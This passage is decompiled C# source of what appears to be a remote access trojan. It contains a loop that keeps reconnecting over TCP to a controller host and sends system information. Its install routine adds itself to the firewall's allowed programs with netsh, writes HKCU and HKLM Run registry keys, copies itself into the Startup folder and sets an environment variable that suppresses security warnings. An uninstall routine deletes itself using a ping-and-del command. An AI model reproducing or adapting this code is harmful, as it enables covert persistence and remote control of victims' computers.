									array11[0] = RuntimeHelpers.GetObjectValue(obj4);
									object[] array12 = array2;
									string[] array13 = null;
									array8[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array7, array12, array13), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null));
									object[] array14 = array8;
									array4 = new bool[3] { true, false, true };
									NewLateBinding.LateCall(obj5, (Type)null, "Write", array14, (string[])null, (Type[])null, array4, true);
									if (array4[0])
									{
										NewLateBinding.LateIndexSetComplex((object)array7, new object[2]
										{
											num2,
											RuntimeHelpers.GetObjectValue(array14[0])
										}, (string[])null, true, false);
									}
									if (array4[2])
									{
										array2 = array10;
										array2[num3] = RuntimeHelpers.GetObjectValue(obj4);
										NewLateBinding.LateSetComplex(NewLateBinding.LateIndexGet((object)array7, array12, array13), (Type)null, "length", new object[1] { RuntimeHelpers.GetObjectValue(array14[2]) }, (string[])null, (Type[])null, true, true);
									}
									continue;
								}
								break;
							}
							break;
						}
					}
					goto IL_0a86;
					end_IL_000c:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				while (true)
				{
					Cn = false;
					try
					{
						NewLateBinding.LateCall(NewLateBinding.LateGet(C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Disconnect", new object[1] { false }, (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					obj = new MemoryStream();
					try
					{
						NewLateBinding.LateCall(Pro, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						Pro = null;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					try
					{
						C = new TcpClient();
						NewLateBinding.LateSet(C, (Type)null, "ReceiveTimeout", new object[1] { -1 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(C, (Type)null, "SendTimeout", new object[1] { -1 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(C, (Type)null, "SendBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(C, (Type)null, "ReceiveBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null);
						NewLateBinding.LateSetComplex(NewLateBinding.LateGet(C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SendBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
						NewLateBinding.LateSetComplex(NewLateBinding.LateGet(C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ReceiveBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
						num = 0;
						object obj6 = NewLateBinding.LateGet(C, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array15 = new object[2] { H, P };
						object[] array16 = array15;
						bool[] array4 = new bool[2] { true, true };
						NewLateBinding.LateCall(obj6, (Type)null, "Connect", array16, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							H = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[0]), typeof(string));
						}
						if (array4[1])
						{
							P = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array15[1]), typeof(string));
						}
						Cn = true;
						Send(inf());
						try
						{
							if (Operators.CompareString(GTV("us"), "!", false) == 0)
							{
								Send(new string(new char[2] { 'u', 's' }));
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							Cn = false;
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						Thread.Sleep(2500);
						ProjectData.ClearProjectError();
						continue;
					}
					break;
				}
				continue;
				IL_0a86:
				Thread.Sleep(1);
			}
		}
	}

	public void UNS()
	{
		pr(0);
		usb.clean();
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { sf, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				sf = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array4 = new object[2] { RG, false };
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "DeleteValue", array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				RG = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array7 = new object[2] { sf, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
				sf = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			object[] array9 = new object[2] { RG, false };
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, "DeleteValue", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				RG = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(new string(new char[37]
			{
				'n', 'e', 't', 's', 'h', ' ', 'f', 'i', 'r', 'e',
				'w', 'a', 'l', 'l', ' ', 'd', 'e', 'l', 'e', 't',
				'e', ' ', 'a', 'l', 'l', 'o', 'w', 'e', 'd', 'p',
				'r', 'o', 'g', 'r', 'a', 'm', ' '
			}) + "\""), NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"')), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe";
			File.Delete(path);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "OpenSubKey", new object[2]
			{
				new char[8] { 'S', 'o', 'f', 't', 'w', 'a', 'r', 'e' },
				true
			}, (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { RG, false };
			object[] array11 = array;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj5, (Type)null, "DeleteSubKey", array11, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				RG = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"cmd.exe /k ping 0 & del \"", NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" & exit")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	private bool CompDir(FileInfo F1, FileInfo F2)
	{
		if (Operators.CompareString(F1.get_Name().ToLower(), F2.get_Name().ToLower(), false) != 0)
		{
			return false;
		}
		DirectoryInfo directoryInfo = F1.Directory;
		DirectoryInfo directoryInfo2 = F2.Directory;
		do
		{
			if (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				directoryInfo = directoryInfo.Parent;
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo == null && directoryInfo2 == null))
				{
					if (directoryInfo == null)
					{
						return false;
					}
					continue;
				}
				return true;
			}
			return false;
		}
		while (directoryInfo2 != null);
		return false;
	}

	public void INS()
	{
		if (!CompDir((FileInfo)LO, new FileInfo(Interaction.Environ(DR).ToLower() + new string(new char[1] { '\\' }) + EXE.ToLower())))
		{
			try
			{
				if (Operators.CompareString(GTV("us"), "", false) == 0)
				{
					if (Conversions.ToBoolean(NewLateBinding.LateGet(NewLateBinding.LateGet(NewLateBinding.LateGet(LO, (Type)null, "Directory", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Contains", new object[1] { new char[1] { ':' } }, (string[])null, (Type[])null, (bool[])null)))
					{
						STV("US", "!");
					}
					else
					{
						STV("US", "@");
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string s = "U0VFX01BU0tfTk9aT05FQ0hFQ0tT";
				Environment.SetEnvironmentVariable(DEB(ref s), "1", EnvironmentVariableTarget.User);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (File.Exists(Interaction.Environ(DR) + "\\" + EXE))
				{
					File.Delete(Interaction.Environ(DR) + "\\" + EXE);
				}
				File.Copy(Conversions.ToString(NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Interaction.Environ(DR) + new string(new char[1] { '\\' }) + EXE, overwrite: true);
				Process.Start(Interaction.Environ(DR) + new string(new char[1] { '\\' }) + EXE);
				ProjectData.EndApp();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"netsh firewall add allowedprogram \"", NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" "), (object)'"'), NewLateBinding.LateGet(LO, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ENABLE")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array = new object[2] { sf, true };
			object[] array2 = array;
			bool[] array3 = new bool[2] { true, false };
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array3);
			if (array3[0])
			{
				sf = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array4 = new object[2]
			{
				RG,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
			};
			object[] array5 = array4;
			bool[] array6 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj2, (Type)null, "SetValue", array5, (string[])null, (Type[])null, array6, true);
			if (array6[0])
			{
				RG = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array4[0]), typeof(string));
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(F, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array7 = new object[2] { sf, true };
			object[] array8 = array7;
			bool[] array6 = new bool[2] { true, false };
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array8, (string[])null, (Type[])null, array6);
			if (array6[0])
			{
				sf = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array7[0]), typeof(string));
			}
			object[] array9 = new object[2]
			{
				RG,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)new char[3] { ' ', '.', '.' })
			};
			object[] array10 = array9;
			bool[] array3 = new bool[2] { true, false };
			NewLateBinding.LateCall(obj4, (Type)null, "SetValue", array10, (string[])null, (Type[])null, array3, true);
			if (array3[0])
			{
				RG = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array9[0]), typeof(string));
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Conversions.ToString(NewLateBinding.LateGet(LO, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + RG + ".exe", overwrite: true);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(1000);
	}
}
